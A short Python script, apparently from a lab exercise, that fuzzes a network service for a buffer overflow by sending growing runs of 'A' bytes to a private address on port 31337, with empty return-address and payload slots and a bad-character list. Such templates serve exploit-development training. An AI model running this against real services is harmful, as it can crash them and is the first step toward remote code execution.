import socket
import os
import time

ip = "192.168.56.103"
port = 31337

all_chars = bytearray(range(1,256))
bad_chars = [b"\x11"]

prefix = ""
offset = 100
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  print("hello")
  s.connect((ip, port))
  while(True):
      print("fuzzing with {} bytes".format(len(buffer)))
      s.send(bytes(buffer + "\n", "latin-1"))
      buffer += "A"*100
      time.sleep(1)
except:
  print("Could not connect.")
